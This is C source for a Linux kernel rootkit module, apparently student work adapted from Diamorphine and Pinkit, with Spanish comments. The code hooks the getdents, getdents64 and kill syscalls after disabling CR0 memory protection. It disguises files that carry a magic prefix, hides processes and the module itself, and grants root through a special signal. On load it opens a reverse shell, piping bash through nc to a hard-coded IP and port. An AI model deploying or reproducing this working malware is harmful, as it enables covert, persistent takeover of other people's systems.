//Rootkit basado en Diamorphine - https://github.com/m0nad/Diamorphine
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/string.h>
//Basado en Pinkit para el ReverseShell - https://github.com/PinkP4nther/Pinkit
#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>


//Definicion de las variables para del IP y Puerto para el ReverseShell
static char *host = "REV_TCP_LH=192.168.18.51";
module_param(host, charp, 0000);
static char *port = "REV_TCP_LP=1337";
module_param(port, charp, 0000);

//Agregar librerias necesarias dependiendo de las versiones de kernel
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

//Definicion del numero de la llamada de sistema GetDents encargada del comando ls en terminal.
#ifndef __NR_getdents
#define __NR_getdents 141
#endif

//Se incluye el header
#include "diamorphine.h"

/*Definicion de las variables o punteros para guardar y ejecutar las llamadas de sistemas,
asi como la variable para control register 0.
En versiones >= 4.4.0 se utilizan los punteros pt_regs y en versiones <= 4.4.0 se utiliza el struct definido en diamorphine.h
*/
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#else
	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
		unsigned int);
	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
		struct linux_dirent64 *, unsigned int);
	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
	orig_getdents_t orig_getdents;
	orig_getdents64_t orig_getdents64;
	orig_kill_t orig_kill;
#endif


/*Definicion de la funcion para buscar las llamadas de sistema en la system_call_table,
dependiendo de la version de kernel se utiliza la funcion kallsyms_lookup_name (kprobe en este caso) o se hace de forma "manual"
*/
unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
#else
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}

//Funcion ya implementada en la solucion para buscar los procesos por medio del ID
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

//Funcion para verificar si el proceso esta oculto por medio del ID.
int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

/*Definicion de las funciones que estaran haciendose pasar por las llamadas de sistema GetDents,
define una para arquitecturas de x64 y otra para x86.
Ademas se declaran de diferentes maneras dependiendo de la version de kernel, ya sea por el puntero pt_regs
o utilizan el struct linux_dirent*/
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0){ //Se realiza la comparacion entre el prefijo y los archivos.
			if (dir == kdirent) {
				printk(KERN_INFO "Entro if (dir == kdirent) 64v"); //Utilizado para hacer debug por medio del comand dmesg
				snprintf(dir->d_name, NAME_MAX, "Oculto"); //Funcion para cambiar de nombre
				//ret -= dir->d_reclen; //Esta la seccion donde se "brinca" el archivo para asi "ocultarlo" de la llamada del sistema
				//memmove(dir, (void *)dir + dir->d_reclen, ret); //Funcion para reacomodar la memoria, esto en caso que el archivo que hizo match sea el primero en la lista.
				continue;
			}
			printk(KERN_INFO "No change: %s\n", dir->d_name); //Utilizado para hacer debug por medio del comand dmesg
			snprintf(dir->d_name, NAME_MAX, "Oculto"); //Funcion para cambiar de nombre
			//prev->d_reclen += dir->d_reclen; //Esta la seccion donde se "brinca" el archivo para asi "ocultarlo" de la llamada del sistema

			printk(KERN_INFO "Change: %s\n", dir->d_name); //Utilizado para hacer debug por medio del comand dmesg
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret); //Se envia la informacion modificada al espacio de usuario cuando se ejecuta el comando ls
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

/*Definicion de las funciones que estaran haciendose pasar por las llamadas de sistema GetDents,
define una para arquitecturas de x64 y otra para x86.
Ademas se declaran de diferentes maneras dependiendo de la version de kernel, ya sea por el puntero pt_regs
o utilizan el struct linux_dirent*/
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0){ //Se realiza la comparacion entre el prefijo y los archivos.
			if (dir == kdirent) {
				printk(KERN_INFO "Entro if (dir == kdirent)"); //Utilizado para hacer debug por medio del comand dmesg
				//ret -= dir->d_reclen; //Esta la seccion donde se "brinca" el archivo para asi "ocultarlo" de la llamada del sistema
				//memmove(dir, (void *)dir + dir->d_reclen, ret); //Funcion para reacomodar la memoria, esto en caso que el archivo que hizo match sea el primero en la lista.
				snprintf(dir->d_name, NAME_MAX, "Oculto"); //Funcion para cambiar de nombre
				continue;
			}
			printk(KERN_INFO "No change: %s\n", dir->d_name); //Utilizado para hacer debug por medio del comand dmesg
			snprintf(dir->d_name, NAME_MAX, "Oculto"); //Funcion para cambiar de nombre
			//prev->d_reclen += dir->d_reclen; //Esta la seccion donde se "brinca" el archivo para asi "ocultarlo" de la llamada del sistema
			
			printk(KERN_INFO "Change: %s\n", dir->d_name); //Utilizado para hacer debug por medio del comand dmesg
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret); //Se envia la informacion modificada al espacio de usuario cuando se ejecuta el comando ls
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

//Funcion implementada en diamorphine para brindar permisos de super usuario o root, es este caso es basicamente igual todo al uid 0.
void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}

//Funcion para la gestion de memoria, liberar o reubicar memoria.
static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

/*Funcions para invisibilizar o visibilizar al modulo hacia el sistema operativo*/
static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

//Implementacion del llamado de sistema kill que se basa en senales dependiendo del numero.
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_kill(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
#endif
	struct task_struct *task;
	switch (sig) {
		case SIGINVIS: //En caso que sea 31, se oculta el proceso basado en el ID. kill -31 1(process id)
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER: //En caso que sea 64, se brindan permisos de root. kill -64 1(process id). Aqui no importa el pid
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show(); //En caso que sea 63, se hace visible o invisible el modulo(rootkit) hacia el sistema. kill -63 1(process id). Aqui no importa el pid
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid, sig);
#endif
	}
	return 0;
}

/*Funcion utlizada para versiones de kernel mas nuevas para modificar el control register CR0,
este contiene ciertos flags de control para el procesador.*/
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

/*Funcion para reestablecer los valores del control register CR0 a su valor original, simplificado: proteger la memoria.*/
static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

/*Funcion para reestablecer los valores del control register CR0 y asi poder hacer modificaciones en el sistema, simplificado: desproteger la memoria.*/
static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}

//Funcion de inicializacion del rootkit
static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf(); //Se ejecucta la funcion para obtener la tabla/lista de llamadas del sistema
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0(); //Se iniciliza el cr0
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot"); //Opciones extra para arquitecturas ARM64 para utilizar la funcion kallsyms_lookup_name
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif

	module_hide(); //Se oculta el rootkit hacia el sistema
	tidy();

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents]; //Se obtienen las referencias de las llamadas del sistemas originales y se guardan en las variables por medio de sus IDs, las variables "__NR_"
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents]; //Se obtienen las referencias de las llamadas del sistemas originales y se guardan en las variables por medio de sus IDs, las variables "__NR_"
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory(); //Se desprotege la memoria antes de hacer alguna modificacion.

	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents; //Se modifican o se asigna el puntero de las llamadas del sistema hacia las funciones creadas en el rootkit.
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory(); //Se protege la memoria nuevamente.
	
	//Declaracion de variables para ejecutar comandos en bash(terminal) por medio del TERM=xterm-256color que es la version utilizada en los SO actualesm, sinos seria xterm.
	char *envp[] = {
		"HOME=/root",
		"TERM=xterm-256color",
		host,
		port,
		NULL
	};
	
	//Declaracion de la variables con los argumentos a ejecutar en el bash(terminal) para crear la ReverseShell
	char *argv[] = {
		"/bin/bash",
		"-c",
		"/usr/bin/rm /tmp/diamorphine;/usr/bin/mkfifo /tmp/diamorphine;/usr/bin/cat /tmp/diamorphine|/bin/bash -i 2>&1|/usr/bin/nc $REV_TCP_LH $REV_TCP_LP >/tmp/diamorphine",
		NULL	
	};
	
	//Funcion de la libreria moduleparam para ejecutar comandos del espacio de usuario desde el kernel, lo cual nos permite ejecutar los argumentos anteriores en terminal.
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

	return 0;
}

//Funcion para remover el rootkit y "limpiar" el sistema
static void __exit
diamorphine_cleanup(void)
{
	unprotect_memory(); //Se desprotege la memoria antes de hacer alguna modificacion.

	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents; //Se vuelven a asignar las funciones originales hacia las llamadas de sistemas por medio de las variables inicializadas en la funcion anterior.
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory(); //Se protege la memoria nuevamente.
}

//Funciones para inicializar y remover el rootkit del sistema
module_init(diamorphine_init);
module_exit(diamorphine_cleanup);
//Funciones para mostrar informacion general del rootkit
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
